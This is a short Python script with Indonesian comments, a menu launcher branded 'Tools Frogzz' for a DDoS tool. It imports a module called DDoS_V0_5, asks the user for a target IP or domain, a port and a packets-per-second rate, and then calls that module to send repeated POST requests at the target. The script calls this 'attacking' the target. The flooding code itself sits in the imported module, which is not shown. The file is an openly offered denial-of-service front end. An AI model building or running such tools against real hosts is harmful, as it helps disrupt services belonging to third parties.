import os
import time
import DDoS_V0_5  # nama file diganti jadi DDoS_V0_5.py biar bisa di-import

def menu():
    os.system("clear")  # atau cls kalau di Windows
    print("========================================")
    print("      Welcome To Tools Frogzz")
    print("========================================")
    print("[ My TikTok  : @frogzzproject ]")
    print("[ My GitHub  : github.com/frogzzproject ]")
    print("[ My YouTube : youtube.com/@frogzz ]\n")
    print("[1] DDoS V0.5")
    print("========================================")
    pilihan = input("Pilih nomor: ")

    if pilihan == "1":
        print("\n[!] Cara pakai: python DDoS-V0.5.py <ip> 80 5\n")
        target_url = input("Target IP / Domain (gunakan http/https): ")
        port = input("Port (misal: 80): ")
        packets = int(input("Packets per second (misal: 5): "))
        duration = 5  # bisa dibuat input juga kalau mau

        print(f"\n[+] Menyerang {target_url} di port {port}")
        print(f"[+] {packets} request/detik selama {duration} detik\n")

        DDoS_V0_5.send_custom_requests(
            target_url=target_url,
            method="POST",
            data={"packet": f"Frogzz_Test_{port}"},
            headers={"User-Agent": "FrogzzAgent"},
            requests_per_second=packets,
            duration=duration
        )
    else:
        print("Pilihan tidak tersedia.")

if __name__ == "__main__":
    menu()
